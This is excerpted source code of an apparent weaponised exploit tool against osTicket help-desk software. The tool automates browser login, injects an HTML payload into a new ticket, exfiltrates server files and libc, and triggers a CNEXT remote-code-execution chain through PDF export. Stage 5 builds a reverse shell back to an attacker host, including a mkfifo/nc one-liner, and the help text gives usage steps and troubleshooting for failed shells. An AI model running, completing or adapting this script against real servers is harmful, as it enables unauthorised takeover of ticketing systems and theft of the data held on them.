...
# ---------------------------------------------------------------------------
# Playwright — browser automation for form-heavy targets
# ---------------------------------------------------------------------------
try:
...
class OsTicketExploit:
    ...
    def __init__(
        ...
        # Playwright browser (initialised in run())
        self._pw = None
    ...
    def _sync_cookies_to_requests(self) -> None:
        """Copy cookies from the Playwright browser → requests session."""
        ...
        log_debug(f"Synced {len(cookies)} cookies to requests.")

    def _wait_for_user(self, prompt: str = "Press Enter to continue…") -> None:
        """Pause execution until user presses Enter in terminal."""
        input(
            f"\n  {Style.CYAN}{Style.BOLD}[PAUSE]{Style.RESET} "
            f"{prompt} "
        )

    def _inject_payload_into_editor(
        self, page: object, payload: str
    ) -> None:
        """Inject HTML payload into the ticket message editor.

        Tries multiple editor APIs (Redactor, CKEditor, TinyMCE)
        and falls back to contenteditable / hidden textarea.
        """
        # JavaScript that tries all common editors
        js_inject = """
        (payload) => {
            // 1. Redactor (osTicket default)
            try {
                let editors = document.querySelectorAll('.redactor-editor');
                if (editors.length > 0) {
                    editors.forEach(el => { el.innerHTML = payload; });
                    // Also set hidden textarea
                    let ta = document.querySelector('textarea[name="message"]');
            ...
            try {
                if (window.CKEDITOR) {
                    for (let name in CKEDITOR.instances) {
                        CKEDITOR.instances[name].setData(payload);
                    }
                    return 'ckeditor';
                }
            } catch(e) {}
        ...
        """
        result = page.evaluate(js_inject, payload)
        log_debug(f"Payload injected via: {result}")
    ...
    def stage_authenticate(self) -> bool:
        """Log in via the browser.  The user can handle CAPTCHAs
        or extra form fields interactively.
        """
        log_stage(2, "AUTHENTICATION (BROWSER)")
        ...
        self._page.goto(
            self._url("login.php"), wait_until="networkidle"
        )
        time.sleep(1)
        ...
        try:
            self._page.fill(
                'input[name="luser"], input[name="email"], '
                'input[type="email"]',
                self.email,
            )
        except Exception:
            log_debug("Could not auto-fill email field.")

        try:
            self._page.fill(
                'input[name="lpasswd"], input[name="passwd"], '
                'input[type="password"]',
                self.password,
            )
        except Exception:
            log_debug("Could not auto-fill password field.")

        log_info(
            "Credentials filled.  Check the browser."
        )
        self._wait_for_user(
            "Solve CAPTCHA / fill extra fields if needed, "
            "then press Enter to submit login…"
        )
        ...
        try:
            ...
            log_warn(f"Submit click failed: {exc}")
        ...
        if (
            "tickets.php" in current_url
            or "profile.php" in current_url
            or "log out" in page_text
        ):
            log_good("Browser login successful!")
            log_info(
                "Establishing parallel requests session…"
            )
            if not self._login():
                log_warn(
                    "Requests login failed — "
                    "will try with synced cookies."
                )
        ...
        self._wait_for_user(
            "If you're logged in, press Enter to continue. "
            "Otherwise Ctrl+C to abort…"
        )
        log_info(
            "Establishing parallel requests session…"
        )
    ...
    def _create_ticket(self, html_body: str) -> Optional[int]:
        """Open the ticket form in the browser for the user to fill
        custom fields, then submit via ``requests`` using the exact
        same method as the non-browser variant.

        The browser is ONLY used for:
          - Showing the form so the user can see custom fields
          - Reading custom field values (hex-named) after user fills them

        The actual POST is done via ``requests`` with its own CSRF
        token, identical to ``osticket_pwn.py`` / ``osticket_revshell.py``.
        """
        try:
            # Navigate browser to open.php so user can see the form
            ...
            log_info("Opening ticket form in browser…")
            self._page.goto(open_url, wait_until="networkidle")
            time.sleep(2)

            # If there's a topic selector, select the right topic
            if self.topic_id:
                try:
                    ...
                    log_debug(
                        "Topic selector not found or already set."
                    )

            # Auto-fill standard fields for the user to see
            ...
            for sel, val in [
                ('input[name="name"]',
                 (self.email.split("@")[0].title()
                  if self.email else "Test")),
                ('input[name="email"]', self.email or ""),
            ]:
                try:
            ...
            # Show placeholder in message editor
            self._page.evaluate("""
                (function() {
                    var msg = '⚠️ PAYLOAD LOADED — do NOT edit';
                    var re = document.querySelector(
                        '.redactor-editor'
                    );
                    if (re) {
                        re.innerHTML = '<p>' + msg + '</p>';
                        return;
                    }
                    if (window.CKEDITOR) {
                        for (var n in CKEDITOR.instances)
                            CKEDITOR.instances[n].setData(
                                '<p>' + msg + '</p>'
                            );
                        return;
                    }
                    ...
                    if (ce)
                        ce.innerHTML = '<p>' + msg + '</p>';
                })()
            """)
            log_good(
                f"Payload ready ({len(html_body):,} chars)."
            )

            # ── PAUSE: let user fill remaining fields ──
            log_info(
                "Check the browser — fill in any "
                "REQUIRED fields (dropdowns, phone, etc.)."
            )
            log_warn(
                "DO NOT click Submit in the browser!  "
                "Press Enter in the terminal instead."
            )
            self._wait_for_user(
                "Press Enter when all fields are filled…"
            )

            # ── Read ONLY custom fields from browser ──
            # Custom fields have hex-like names (e.g. '79f7fd6a23244b')
            # Standard fields (name, email, subject, message, a,
            # topicId, __CSRFToken__) will come from requests.
            custom_fields = self._page.evaluate("""
                () => {
                    const data = {};
                    const form = document.querySelector('form');
                    if (!form) return data;
                    const skip = new Set([
                        '__CSRFToken__', 'a', 'topicId',
                        'name', 'email', 'subject', 'message',
                        'reset', 'cancel', 'draft_id'
                    ]);
            ...
            if custom_fields:
                log_debug(
                    f"Custom fields from browser: "
                    f"{list(custom_fields.keys())}"
                )
            else:
                log_debug("No custom fields found in browser.")

            # ── POST via requests (identical to non-browser) ──
            # This is the EXACT same method used in osticket_pwn.py
            # and osticket_revshell.py which works reliably.
            log_info("Submitting ticket via requests…")
            resp = self.session.get(
                open_url, timeout=REQUEST_TIMEOUT
            )
            csrf = extract_csrf_token(resp.text)
            if not csrf:
            ...
            if "unable to create" in body_lower:
                log_fail("osTicket rejected the ticket.")
                err_match = re.search(
                    r'<div[^>]*class="[^"]*error[^"]*"'
                    r'[^>]*>(.*?)</div>',
                    resp.text,
                ...
                if err_match:
                    log_fail(
                        f"  Error: "
                        f"{err_match.group(1).strip()[:200]}"
                    )
                log_info(f"  Response saved: {resp_path}")
                return None

            # Extract ticket ID
            match = re.search(
                r"tickets\.php\?id=(\d+)", resp.url
            )
            if match:
            ...
            log_warn(
                "Ticket may have been created but ID "
                "not found."
            )
            return None
    ...
    def _print_ticket_pdf(self, ticket_id: int) -> Optional[bytes]:
        """Export ticket to PDF using the browser session.

        The browser has the full authenticated session (cookies,
        CSRF tokens, etc.) which requests may not have.
        """
        url = self._url(f"tickets.php?a=print&id={ticket_id}")
        log_debug(f"PDF export URL: {url}")

        # Strategy 1: Use Playwright browser (has full session)
        if self._page:
            try:
                resp = self._page.goto(url, wait_until="load")
                time.sleep(2)
                ...
                log_debug(
                    "Trying Playwright download handler…"
                )
                ...
                log_debug(f"Browser PDF export: {exc}")
        ...
        try:
            ...
            if self._page:
                try:
                    ...
                    time.sleep(2)
                    rendered = self._page.pdf()
                    if rendered and len(rendered) > 100:
                        return rendered
                except Exception as exc2:
                    log_debug(f"page.pdf() failed: {exc2}")
    ...
    # ──────────────────────────────────────────────────────────────────────────
    #  STAGE 5: CNEXT RCE → REVERSE SHELL
    # ──────────────────────────────────────────────────────────────────────────

    def stage_cnext_rce(self) -> bool:
        """Generate and inject CNEXT payload that spawns a reverse shell.

        No files written on disk — the shell connects back directly.

        Returns ``True`` if the payload was successfully triggered.
        """
        log_stage(5, "CNEXT RCE → REVERSE SHELL")
        ...
        if not self.lhost or not self.lport:
            log_fail(
                "Reverse shell requires --lhost and --lport."
            )
            return False

        log_info(f"Reverse shell target: {self.lhost}:{self.lport}")
        log_warn(
        ...
        # CNEXT command limit: 0x140 (320) bytes total including
        # the "kill -9 $PPID; sleep 1; " prefix (~27 bytes).
        lh = self.lhost
        lp = self.lport
        ...
        # Try bash first, then python as fallback
        shell_cmd = (
            f"bash -c '{bash_rev}' "
            f"|| {py_rev}"
        )
        ...
        if len(shell_cmd) + prefix_len > 310:
            shell_cmd = f"bash -c '{bash_rev}'"

        if len(shell_cmd) + prefix_len > 310:
            shell_cmd = (
                f"rm /tmp/f;mkfifo /tmp/f;"
                f"cat /tmp/f|/bin/sh -i 2>&1"
                f"|nc {lh} {lp} >/tmp/f"
            )

        log_debug(
            f"Shell command: {len(shell_cmd)} bytes "
            f"(+~{prefix_len} prefix)"
        )
        ...
        # Inject via a NEW ticket (browser-based)
        ticket_html = PayloadGenerator.wrap_for_ticket(
        ...
        log_warn(
            f"Check your listener — shell should connect to "
            f"{self.lhost}:{self.lport}"
        )
        try:
            self._print_ticket_pdf(cnext_ticket_id)
        except Exception:
            pass  # Expected — the process dies

        time.sleep(2)

        log_good(
            "Payload triggered!  If your listener received a "
            "connection, you have a shell."
        )
        log_info(
            "If no connection was received, possible reasons:\n"
            "        • Outbound connections blocked by firewall\n"
            "        • bash /dev/tcp not available (try nc/python)\n"
            "        • Wrong libc offsets (target didn't crash)\n"
            "        • Target recovered from crash before shell exec"
        )
        return True
    ...
    def run(self) -> None:
        """Execute the full exploitation chain with browser assist."""
        banner()
        ...
        log_info(
            f"Revshell: {self.lhost}:{self.lport}"
        )
        log_info(
            f"Browser : "
            f"{'headless' if self.headless else 'visible'}"
        ...
        # --- STAGE 1 (requests — no browser needed) ---
        if not self.stage_recon():
            log_fail("Reconnaissance failed.  Aborting.")
            sys.exit(1)

        # Launch browser before stage 2
        self._init_browser()
        ...
        try:
            ...
            # --- STAGE 3 (browser + requests) ---
            if not self.stage_file_exfiltration():
                log_fail("File exfiltration failed.  Aborting.")
                log_info(
                    f"Debug artefacts saved in: {self._tmpdir}"
                )
                sys.exit(1)

            # --- STAGE 4 (browser + requests) ---
            if not self.stage_libc_acquisition():
                ...
                log_info(
                    f"Exfiltrated files saved in: "
                    f"{self._tmpdir}"
                )
                sys.exit(1)

            # --- STAGE 5 (browser → reverse shell) ---
            if not self.stage_cnext_rce():
                log_fail(
                    "CNEXT RCE failed.  See above for details."
                )
                sys.exit(1)
...
def parse_arguments() -> argparse.Namespace:
    ...
    parser = argparse.ArgumentParser(
        description=(
            ...
            "REVERSE SHELL.  BROWSER-ASSISTED: opens a real browser "
            "so you can fill custom form fields.  No file written "
            "on target."
        ),
        ...
        epilog=(
            ...
            "--lhost 10.0.0.1 --lport 9001 --headless\n\n"
            "How it works:\n"
            "  1. Browser opens the ticket form\n"
            "  2. Payload is auto-injected into the message field\n"
            "  3. Script PAUSES — you fill remaining required fields\n"
            "  4. Press Enter in terminal → script submits\n"
            "  5. CNEXT triggers → reverse shell connects back\n\n"
            "Requirements:\n"
            "  pip install playwright pwntools\n"
            "  playwright install chromium\n"
        ),
    )
    parser.add_argument(
